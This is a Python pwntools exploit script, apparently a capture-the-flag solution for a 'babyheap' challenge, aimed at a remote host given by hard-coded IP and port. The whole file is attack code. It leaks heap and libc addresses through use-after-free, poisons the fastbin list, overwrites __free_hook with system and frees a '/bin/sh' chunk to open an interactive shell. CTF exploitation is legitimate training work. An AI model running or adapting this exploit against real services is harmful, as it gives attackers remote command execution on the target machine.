from pwn import *

#context.log_level = 'debug'
#p = process('./babyheap')
p = remote('96.45.183.6', 9999)
libc = ELF('./libc.so.6')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

#free_got = elf.symbols['free']

def alloc(index, content):
        p.recvuntil('Choice:')
        p.sendline('1')
        p.recvuntil('Index:')
        p.sendline(str(index))
        p.recvuntil('Content:')
        p.sendline(content)
	sleep(0.5)

def edit(index, content):
        p.recvuntil('Choice:')
        p.sendline('2')
        p.recvuntil('Index:')
        p.sendline(str(index))
        p.recvuntil('Content:')
        p.sendline(content)
	sleep(0.5)

def show(index):
        p.recvuntil('Choice:')
        p.sendline('3')
        p.recvuntil('Index:')
        p.sendline(str(index))
	sleep(0.5)

def free(index):
        p.recvuntil('Choice:')
        p.sendline('4')
        p.recvuntil('Index:')
        p.sendline(str(index))
	sleep(0.5)

def leak_heap():
        return res

alloc(0, '0')
alloc(1, '1')
alloc(2, '2')

free(1)
free(0)
show(0)
heap_addr = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00')) - 0x30
print "heap_addr : %#x " % heap_addr

chunk_ptr = 0x602060
alloc(3, p64(0) + p32(0x31))
alloc(4, '4')
free(4)
edit(4, p64(heap_addr + 0x10))
alloc(5, '5')
alloc(6, p64(chunk_ptr - 0x18) + p64(chunk_ptr - 0x10) + p64(0x20) + p32(0x90))
free(0)
alloc(7, p64(0) + p32(0))
alloc(8, '8')
alloc(9, '/bin/sh\x00')

#gdb.attach(p)

free(5)

show(6)
libc_base = (u64(p.recvline()[:6].ljust(8, '\x00')) - 0x3C3B78)
system = libc_base + libc.symbols['system']
free_hook = libc.symbols['__free_hook'] + libc_base
print "libc_base : %#x" % libc_base
print "free_hook : %#x" % free_hook
print "system : %#x" % system

gdb.attach(p)

payload = p64(0)*3 + p64(free_hook)
edit(0, payload[:-1])
edit(0, p64(system))
free(9)

p.interactive()
